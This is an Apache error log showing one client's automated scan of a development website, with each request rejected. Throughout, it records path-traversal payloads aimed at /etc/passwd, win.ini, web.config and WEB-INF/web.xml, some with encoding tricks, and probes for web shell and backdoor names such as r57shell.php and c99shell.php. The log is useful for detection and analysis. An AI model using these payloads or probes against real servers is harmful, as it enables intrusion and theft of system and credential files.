[Wed Jul 07 19:28:40.602360 2021] [core:error] [pid 14815] [client 27.147.202.214:11857] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:41.019309 2021] [php7:error] [pid 14456] [client 27.147.202.214:9766] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:41.039914 2021] [core:error] [pid 14419] [client 27.147.202.214:3852] AH00126: Invalid URI in request GET /icons/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:41.852750 2021] [core:error] [pid 14809] [client 27.147.202.214:10274] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:42.013962 2021] [authz_core:error] [pid 14373] [client 27.147.202.214:9784] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/.htaccess
[Wed Jul 07 19:28:42.044121 2021] [core:error] [pid 14376] [client 27.147.202.214:13497] AH00126: Invalid URI in request GET /icons/../../../web.config HTTP/1.1
[Wed Jul 07 19:28:42.381152 2021] [core:error] [pid 14799] [client 27.147.202.214:7561] AH00126: Invalid URI in request GET /icons/../../../package.json HTTP/1.1
[Wed Jul 07 19:28:42.676715 2021] [core:error] [pid 14456] [client 27.147.202.214:9766] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:42.974725 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:28:43.260159 2021] [core:error] [pid 14815] [client 27.147.202.214:13533] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:43.384302 2021] [core:error] [pid 14809] [client 27.147.202.214:13557] AH00126: Invalid URI in request GET /icons/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:43.627902 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/pi.php' not found or unable to stat
[Wed Jul 07 19:28:43.664651 2021] [core:error] [pid 14890] [client 27.147.202.214:13571] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:28:43.674589 2021] [core:error] [pid 14911] [client 27.147.202.214:13681] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:28:43.729684 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/r57shell.php' not found or unable to stat
[Wed Jul 07 19:28:43.894038 2021] [php7:error] [pid 14373] [client 27.147.202.214:9784] script '/var/www/html/dev.wilkescw.com/js/extention/webadmin.php' not found or unable to stat
[Wed Jul 07 19:28:43.994668 2021] [core:error] [pid 14906] [client 27.147.202.214:3892] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:28:44.055130 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/r57.php' not found or unable to stat
[Wed Jul 07 19:28:44.138213 2021] [core:error] [pid 14369] [client 27.147.202.214:13529] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:44.290090 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/php.php' not found or unable to stat
[Wed Jul 07 19:28:44.381962 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/r58.php' not found or unable to stat
[Wed Jul 07 19:28:44.530727 2021] [core:error] [pid 14808] [client 27.147.202.214:7565] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:44.602997 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/i.php' not found or unable to stat
[Wed Jul 07 19:28:44.717723 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/c99shell.php' not found or unable to stat
[Wed Jul 07 19:28:44.989197 2021] [core:error] [pid 14890] [client 27.147.202.214:13644] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:45.189259 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:45.404371 2021] [php7:error] [pid 14369] [client 27.147.202.214:13738] script '/var/www/html/dev.wilkescw.com/js/_notes/enji9fh9dlqe.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:45.454517 2021] [core:error] [pid 14424] [client 27.147.202.214:13711] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:45.496078 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/test.php' not found or unable to stat
[Wed Jul 07 19:28:45.587626 2021] [php7:error] [pid 14345] [client 27.147.202.214:11155] script '/var/www/html/dev.wilkescw.com/js/extention/c99.php' not found or unable to stat
[Wed Jul 07 19:28:45.607253 2021] [core:error] [pid 14880] [client 27.147.202.214:13817] AH00126: Invalid URI in request GET /icons/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:45.814224 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/temp.php' not found or unable to stat
[Wed Jul 07 19:28:45.893193 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/extention/nstview.php' not found or unable to stat
[Wed Jul 07 19:28:45.919988 2021] [core:error] [pid 14857] [client 27.147.202.214:3893] AH00126: Invalid URI in request GET /icons/../../../../web.config HTTP/1.1
[Wed Jul 07 19:28:46.212778 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/extention/nst.php' not found or unable to stat
[Wed Jul 07 19:28:46.247161 2021] [core:error] [pid 14815] [client 27.147.202.214:13593] AH00126: Invalid URI in request GET /icons/../../../../package.json HTTP/1.1
[Wed Jul 07 19:28:46.440225 2021] [core:error] [pid 14911] [client 27.147.202.214:13696] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:46.546066 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/extention/rst.php' not found or unable to stat
[Wed Jul 07 19:28:46.553408 2021] [core:error] [pid 14467] [client 27.147.202.214:13737] AH00126: Invalid URI in request GET /icons/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:46.676469 2021] [php7:error] [pid 14856] [client 27.147.202.214:11872] script '/var/www/html/dev.wilkescw.com/js/extention/info.php' not found or unable to stat
[Wed Jul 07 19:28:46.729413 2021] [core:error] [pid 14808] [client 27.147.202.214:13741] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:28:46.840990 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/extention/r57eng.php' not found or unable to stat
[Wed Jul 07 19:28:46.997954 2021] [core:error] [pid 14809] [client 27.147.202.214:13748] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:47.164159 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/shell.php' not found or unable to stat
[Wed Jul 07 19:28:47.475496 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/dra.php' not found or unable to stat
[Wed Jul 07 19:28:47.769921 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/r.php' not found or unable to stat
[Wed Jul 07 19:28:48.088399 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/lol.php' not found or unable to stat
[Wed Jul 07 19:28:48.224436 2021] [core:error] [pid 14910] [client 27.147.202.214:4026] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:48.402975 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/zehir.php' not found or unable to stat
[Wed Jul 07 19:28:48.512460 2021] [core:error] [pid 14367] [client 27.147.202.214:10298] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:28:48.553169 2021] [core:error] [pid 14419] [client 27.147.202.214:13599] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:28:48.725075 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:28:48.833529 2021] [core:error] [pid 14345] [client 27.147.202.214:11155] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:49.048052 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:28:49.295117 2021] [php7:error] [pid 14340] [client 27.147.202.214:11873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:49.357943 2021] [php7:error] [pid 14456] [client 27.147.202.214:13736] script '/var/www/html/dev.wilkescw.com/js/extention/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:28:49.456904 2021] [core:error] [pid 14858] [client 27.147.202.214:13646] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:49.490677 2021] [core:error] [pid 14808] [client 27.147.202.214:4007] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:28:49.912543 2021] [core:error] [pid 14909] [client 27.147.202.214:13572] AH00126: Invalid URI in request GET /icons/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:50.114077 2021] [php7:error] [pid 14857] [client 27.147.202.214:11948] script '/var/www/html/dev.wilkescw.com/js/_notes/apc.php' not found or unable to stat
[Wed Jul 07 19:28:50.236223 2021] [core:error] [pid 14856] [client 27.147.202.214:11872] AH00126: Invalid URI in request GET /icons/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:28:50.567582 2021] [core:error] [pid 14943] [client 27.147.202.214:11955] AH00126: Invalid URI in request GET /icons/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:28:50.602185 2021] [core:error] [pid 14369] [client 27.147.202.214:13738] AH00126: Invalid URI in request GET /fonts/OpenSans//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:28:50.888799 2021] [core:error] [pid 14809] [client 27.147.202.214:4042] AH00126: Invalid URI in request GET /icons/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:50.889672 2021] [core:error] [pid 14373] [client 27.147.202.214:9784] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:28:51.095678 2021] [authz_core:error] [pid 14857] [client 27.147.202.214:11948] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/_notes/.htaccess
[Wed Jul 07 19:28:51.205530 2021] [core:error] [pid 14426] [client 27.147.202.214:4019] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:51.827855 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/js/_notes/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:28:52.489591 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/js/_notes/pi.php' not found or unable to stat
[Wed Jul 07 19:28:52.620145 2021] [php7:error] [pid 14372] [client 27.147.202.214:2734] script '/var/www/html/dev.wilkescw.com/js/_notes/r57shell.php' not found or unable to stat
[Wed Jul 07 19:28:52.739293 2021] [core:error] [pid 14419] [client 27.147.202.214:2726] AH00126: Invalid URI in request GET /fonts/OpenSans//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:28:52.939259 2021] [php7:error] [pid 14372] [client 27.147.202.214:2734] script '/var/www/html/dev.wilkescw.com/js/_notes/r57.php' not found or unable to stat
[Wed Jul 07 19:28:53.152083 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/js/_notes/php.php' not found or unable to stat
[Wed Jul 07 19:28:53.207255 2021] [core:error] [pid 14786] [client 27.147.202.214:1499] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:53.233249 2021] [core:error] [pid 14808] [client 27.147.202.214:2738] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:53.252161 2021] [php7:error] [pid 14372] [client 27.147.202.214:2734] script '/var/www/html/dev.wilkescw.com/js/_notes/r58.php' not found or unable to stat
[Wed Jul 07 19:28:53.255981 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/webadmin.php' not found or unable to stat
[Wed Jul 07 19:28:53.361073 2021] [php7:error] [pid 14340] [client 27.147.202.214:11873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:53.490047 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/js/_notes/i.php' not found or unable to stat
[Wed Jul 07 19:28:53.573471 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/c99shell.php' not found or unable to stat
[Wed Jul 07 19:28:53.810138 2021] [php7:error] [pid 14395] [client 27.147.202.214:3309] script '/var/www/html/dev.wilkescw.com/js/_notes/test.php' not found or unable to stat
[Wed Jul 07 19:28:53.880562 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/c99.php' not found or unable to stat
[Wed Jul 07 19:28:54.214788 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/nstview.php' not found or unable to stat
[Wed Jul 07 19:28:54.419766 2021] [core:error] [pid 14405] [client 27.147.202.214:10338] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:54.479091 2021] [core:error] [pid 14384] [client 27.147.202.214:1494] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:28:54.536475 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/nst.php' not found or unable to stat
[Wed Jul 07 19:28:54.677439 2021] [php7:error] [pid 14807] [client 27.147.202.214:11876] script '/var/www/html/dev.wilkescw.com/js/_notes/temp.php' not found or unable to stat
[Wed Jul 07 19:28:54.823340 2021] [core:error] [pid 14365] [client 27.147.202.214:3779] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:54.853562 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/rst.php' not found or unable to stat
[Wed Jul 07 19:28:55.005475 2021] [php7:error] [pid 14807] [client 27.147.202.214:11876] script '/var/www/html/dev.wilkescw.com/js/_notes/info.php' not found or unable to stat
[Wed Jul 07 19:28:55.807121 2021] [core:error] [pid 14426] [client 27.147.202.214:10902] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:28:55.859165 2021] [core:error] [pid 14815] [client 27.147.202.214:11953] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:28:56.270207 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/r57eng.php' not found or unable to stat
[Wed Jul 07 19:28:56.583807 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/shell.php' not found or unable to stat
[Wed Jul 07 19:28:56.780951 2021] [core:error] [pid 14908] [client 27.147.202.214:10944] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:28:56.809868 2021] [core:error] [pid 14951] [client 27.147.202.214:10952] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:56.891561 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/dra.php' not found or unable to stat
[Wed Jul 07 19:28:57.203165 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/r.php' not found or unable to stat
[Wed Jul 07 19:28:57.439535 2021] [php7:error] [pid 14808] [client 27.147.202.214:10914] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/t9i0m0n437ez.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:28:57.524391 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/lol.php' not found or unable to stat
[Wed Jul 07 19:28:57.845556 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/zehir.php' not found or unable to stat
[Wed Jul 07 19:28:58.168884 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:28:58.329134 2021] [core:error] [pid 14786] [client 27.147.202.214:10911] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:28:58.419517 2021] [core:error] [pid 14892] [client 27.147.202.214:10917] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:28:58.484040 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:28:58.745967 2021] [core:error] [pid 14419] [client 27.147.202.214:10877] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:28:58.822716 2021] [php7:error] [pid 14871] [client 27.147.202.214:13511] script '/var/www/html/dev.wilkescw.com/js/_notes/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:28:58.960242 2021] [core:error] [pid 14807] [client 27.147.202.214:11876] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:28:59.073001 2021] [core:error] [pid 14857] [client 27.147.202.214:11948] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:28:59.399841 2021] [core:error] [pid 14467] [client 27.147.202.214:3967] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:28:59.468139 2021] [core:error] [pid 14336] [client 27.147.202.214:10825] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:00.347641 2021] [core:error] [pid 14944] [client 27.147.202.214:8066] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:00.670127 2021] [core:error] [pid 14356] [client 27.147.202.214:10816] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:29:00.992407 2021] [core:error] [pid 14359] [client 27.147.202.214:10890] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:29:01.042876 2021] [core:error] [pid 14405] [client 27.147.202.214:10912] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:01.090547 2021] [core:error] [pid 14331] [client 27.147.202.214:10791] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:01.319715 2021] [core:error] [pid 14372] [client 27.147.202.214:2734] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:01.379855 2021] [core:error] [pid 14367] [client 27.147.202.214:2727] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:01.580378 2021] [authz_core:error] [pid 14799] [client 27.147.202.214:13740] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/.htaccess~
[Wed Jul 07 19:29:01.705822 2021] [php7:error] [pid 14340] [client 27.147.202.214:11873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:01.889458 2021] [authz_core:error] [pid 14799] [client 27.147.202.214:13740] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/.htaccess.old
[Wed Jul 07 19:29:02.020266 2021] [php7:error] [pid 14383] [client 27.147.202.214:10859] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:02.179721 2021] [core:error] [pid 14477] [client 27.147.202.214:10913] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:02.212236 2021] [authz_core:error] [pid 14799] [client 27.147.202.214:13740] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/.htaccess.save
[Wed Jul 07 19:29:02.338084 2021] [php7:error] [pid 14904] [client 27.147.202.214:10910] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/apc.php' not found or unable to stat
[Wed Jul 07 19:29:02.512697 2021] [core:error] [pid 14908] [client 27.147.202.214:11273] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:29:02.883506 2021] [php7:error] [pid 14383] [client 27.147.202.214:10859] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:03.201773 2021] [php7:error] [pid 14383] [client 27.147.202.214:10859] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:03.242856 2021] [core:error] [pid 14372] [client 27.147.202.214:11339] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:03.515583 2021] [core:error] [pid 14871] [client 27.147.202.214:13511] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:03.559529 2021] [core:error] [pid 14359] [client 27.147.202.214:11322] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:03.778561 2021] [core:error] [pid 14811] [client 27.147.202.214:11286] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:03.840297 2021] [core:error] [pid 14336] [client 27.147.202.214:11254] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:29:03.879943 2021] [core:error] [pid 14892] [client 27.147.202.214:11177] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:03.888338 2021] [core:error] [pid 14369] [client 27.147.202.214:11357] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:29:04.094210 2021] [core:error] [pid 14944] [client 27.147.202.214:11282] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:04.789665 2021] [core:error] [pid 14478] [client 27.147.202.214:9072] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Wed Jul 07 19:29:04.858411 2021] [core:error] [pid 14908] [client 27.147.202.214:9075] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:05.326306 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:29:05.725541 2021] [core:error] [pid 14403] [client 27.147.202.214:1171] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
